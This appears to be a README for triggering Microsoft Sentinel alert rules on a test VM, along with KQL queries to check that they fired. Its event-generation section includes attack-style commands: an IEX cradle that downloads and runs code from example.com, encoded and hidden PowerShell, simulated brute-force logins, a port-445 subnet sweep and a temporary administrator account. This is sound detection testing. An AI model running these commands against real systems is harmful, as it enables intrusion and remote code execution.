# 🚨 Generate Security Events for Sentinel Testing

## Prerequisites
1. Azure Sentinel infrastructure deployed
2. Test VM running and accessible
3. Microsoft Monitoring Agent installed on VM

## 🔍 **Alert Rule 1: Suspicious Sign-in Activity**

### What it detects:
- Multiple failed login attempts (5+) from external IPs
- Triggers: High severity alert

### How to trigger:
```powershell
# On the Windows VM, simulate failed RDP attempts
# Method 1: Use PowerShell to simulate failed logins
$users = @("admin", "administrator", "root", "test", "guest")
foreach ($user in $users) {
    for ($i = 1; $i -le 3; $i++) {
        Write-Host "Simulating failed login for user: $user (attempt $i)"
        # This will generate Event ID 4625 (failed logon)
        Start-Process -FilePath "net" -ArgumentList "use", "\\127.0.0.1\c$", "/user:$user", "wrongpassword" -Wait -NoNewWindow 2>$null
        Start-Sleep 2
    }
}
```

### Manual RDP attempts:
1. Get the VM's public IP from Azure portal
2. Use Remote Desktop Connection
3. Try logging in with wrong credentials multiple times:
   - Username: `admin`, Password: `wrongpassword123`
   - Username: `administrator`, Password: `badpassword`
   - Username: `root`, Password: `hackme`

---

## 🌐 **Alert Rule 2: High-Risk IP Activity**

### What it detects:
- Authentication attempts from known malicious IPs
- Uses external threat intelligence feed

### How to trigger:
This alert uses real threat intelligence, so it's harder to simulate. Instead:

1. **Monitor the alert rule** in Sentinel → Analytics
2. **Check the query manually**:
```kql
let RiskyIPs = externaldata(IPAddress: string)
[@"https://raw.githubusercontent.com/stamparm/ipsum/master/ipsum.txt"] 
with (format="txt", ignoreFirstRecord=true)
| where IPAddress matches regex @"\d+\.\d+\.\d+\.\d+"
| extend IPAddress = trim_start(@"[0-9]+\s+", IPAddress)
| distinct IPAddress;
SigninLogs
| where TimeGenerated > ago(1d)
| where IPAddress in (RiskyIPs)
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType
```

---

## 🔐 **Alert Rule 3: Key Vault Access Anomalies**

### What it detects:
- Unusual access patterns to Key Vault secrets
- Triggers on 3x normal access volume

### How to trigger:
```bash
# Use Azure CLI to repeatedly access Key Vault
# First, get your Key Vault name
az keyvault list --query "[].name" -o tsv

# Then repeatedly access secrets
VAULT_NAME="your-keyvault-name"
for i in {1..50}; do
    echo "Access attempt $i"
    az keyvault secret show --name "test-secret" --vault-name $VAULT_NAME --query "value" -o tsv
    sleep 2
done
```

Or use PowerShell on the VM:
```powershell
# Install Azure PowerShell if not installed
Install-Module -Name Az -Force -AllowClobber

# Connect to Azure
Connect-AzAccount

# Repeatedly access Key Vault
$vaultName = "your-keyvault-name"  # Replace with actual name
for ($i = 1; $i -le 50; $i++) {
    Write-Host "Key Vault access attempt $i"
    try {
        Get-AzKeyVaultSecret -VaultName $vaultName -Name "test-secret" -AsPlainText
    } catch {
        Write-Host "Access attempt failed: $($_.Exception.Message)"
    }
    Start-Sleep 3
}
```

---

## 🖥️ **Generate Windows Security Events**

### Create suspicious PowerShell activity:
```powershell
# Run these commands on the Windows VM to generate security events

# 1. Suspicious PowerShell commands (Event ID 4688)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Host 'Test'"
powershell.exe -EncodedCommand "VwByaXRlLUhvc3QgJ1Rlc3QnOw=="
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test')"

# 2. Create and delete files rapidly (suspicious behavior)
for ($i = 1; $i -le 20; $i++) {
    New-Item -Path "C:\temp\suspicious_file_$i.txt" -ItemType File -Force
    Remove-Item -Path "C:\temp\suspicious_file_$i.txt" -Force
}

# 3. Network scanning simulation
1..254 | ForEach-Object {
    Test-NetConnection -ComputerName "192.168.1.$_" -Port 445 -InformationLevel Quiet
}
```

### Create user account events:
```powershell
# As Administrator, create and delete user accounts
net user testuser Password123! /add
net user testuser /delete

net user suspicioususer Password123! /add
net localgroup administrators suspicioususer /add
net localgroup administrators suspicioususer /delete
net user suspicioususer /delete
```

---

## 📊 **Monitor Alerts in Sentinel**

### 1. Check Alert Rules Status:
1. Go to Azure Portal → Microsoft Sentinel
2. Select your workspace
3. Go to **Analytics** → **Active rules**
4. Verify rules are enabled and running

### 2. View Triggered Incidents:
1. Go to **Incidents** in Sentinel
2. Look for new incidents created by your test events
3. Click on incidents to see details and investigate

### 3. Query Raw Data:
```kql
// Check for failed login events
SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4625  // Failed logon
| project TimeGenerated, Account, IpAddress, WorkstationName, ProcessName

// Check for PowerShell events
SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4688  // Process creation
| where ProcessName contains "powershell"
| project TimeGenerated, Account, ProcessName, CommandLine

// Check Key Vault access
AzureDiagnostics
| where TimeGenerated > ago(1h)
| where ResourceType == "VAULTS"
| where OperationName in ("SecretGet", "KeyGet", "VaultGet")
| project TimeGenerated, CallerIPAddress, OperationName, ResultSignature
```

---

## ⚠️ **Safety Notes**

1. **Test Environment Only**: Only run these on your test VM
2. **Clean Up**: Delete test files and accounts after testing
3. **Monitor Costs**: Watch Azure costs during testing
4. **Real Threats**: Don't use actual malicious IPs or domains

---

## 🎯 **Expected Timeline**

- **Immediate**: Security events logged to VM
- **5-10 minutes**: Events ingested into Log Analytics
- **15-30 minutes**: Alert rules evaluate and trigger
- **30+ minutes**: Incidents created in Sentinel

---

## 🔍 **Troubleshooting**

If alerts don't trigger:
1. Check if VM has Microsoft Monitoring Agent installed
2. Verify Log Analytics workspace is receiving data
3. Confirm alert rules are enabled
4. Check query syntax in Analytics rules
5. Verify time windows in alert rules match your test timing

Happy testing! 🚀
